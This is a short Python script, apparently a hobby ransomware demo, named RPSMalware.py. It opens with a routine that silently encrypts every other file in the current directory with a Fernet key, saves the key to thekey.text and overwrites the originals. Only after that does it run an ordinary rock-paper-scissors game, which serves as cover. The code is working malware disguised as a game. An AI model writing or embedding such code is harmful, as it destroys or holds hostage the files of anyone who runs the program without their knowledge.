from random import randint
import os
from cryptography.fernet import Fernet

#malware
#ransomware
files = []

#encrypt every file in the current directory
for file in os.listdir():
    if file=="RPSMalware.py" or file=="thekey.text" or file=="decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
key=Fernet.generate_key()

with open("thekey.text","wb") as thekey:
    thekey.write(key)
for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)

#game
player = False

choices = ['rock','paper','scissors']
computer = choices[randint(0,2)]
while player == False:
    player = input("rock,paper or scissors? Enter q to quit! ")
    if player==computer:
        print("tie")
        player = False
        computer = choices[randint(0,2)]
    elif player == "rock":
        if computer == "paper":
            print("you lose!")
        elif computer == "scissors":
            print("you win")
        player = False
        computer = choices[randint(0,2)]
    elif player == "scissors":
        if computer == "paper":
            print("you win")
        elif computer == "rock":
            print("you lose")
        player = False
        computer = choices[randint(0,2)]
    elif player == "paper":
        if computer == "rock":
            print("you win")
        elif computer == "scissors":
            print("you lose")
        player = False
        computer = choices[randint(0,2)]
    elif player == "q":
        break
    else:
        player = False
        computer = choices[randint(0,2)]
